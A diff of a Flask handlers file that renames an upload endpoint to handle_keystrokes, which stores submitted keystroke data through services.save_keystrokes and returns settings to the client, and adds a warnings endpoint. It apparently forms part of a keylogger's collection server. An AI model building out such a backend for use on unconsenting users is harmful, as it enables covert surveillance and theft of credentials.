@@ -1,7 +1,5 @@
 from flask import jsonify
 import services
-import random
-
 
 def handle_login(request):
     data = request.get_json()
@@ -15,11 +13,9 @@ def handle_login(request):
     else:
         return jsonify({"success": False, "message": "Invalid username or password"}), 401
 
-
 def handle_update_settings(request):
     data = request.get_json()
     return services.update_settings(data)
-
 
 def handle_get_settings():
     return services.get_settings()
@@ -53,7 +49,14 @@ def handle_delete_notifications(request):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-def handle_upload(request):
+def handle_get_warnings():
+    try:
+        alerts = services.get_warnings()
+        return jsonify(alerts), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+def handle_keystrokes(request):
     if not request.is_json:
         return jsonify({"error": "Request must be JSON"}), 400
     data = request.get_json()
@@ -61,7 +64,6 @@ def handle_upload(request):
     if not data:
         return jsonify({"data": False, "settings": settings}), 200
     try:
-
         services.save_keystrokes(data)
         return jsonify({"data": True, "settings": settings}), 200
     except Exception as e:
